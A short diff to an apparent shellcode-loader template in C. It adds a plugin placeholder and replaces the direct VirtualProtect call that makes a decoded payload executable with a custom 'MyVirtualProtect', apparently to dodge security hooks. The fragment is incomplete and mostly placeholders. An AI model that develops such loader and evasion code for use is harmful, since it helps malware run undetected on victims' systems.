@@ -15,6 +15,7 @@ char *supermega_payload;
 
 {{plugin_executionguardrail}}
 
+{{plugin_virtualprotect}}
 
 /* VirtualAlloc -> rw -> rx
 
@@ -49,7 +50,7 @@ int main()
 	// to:   dest[]
 {{ plugin_decoder }}
 
-	if (VirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
+	if (MyVirtualProtect(dest, {{PAYLOAD_LEN}}, p_RX, &result) == 0) {
 		return 7;
 	}
 
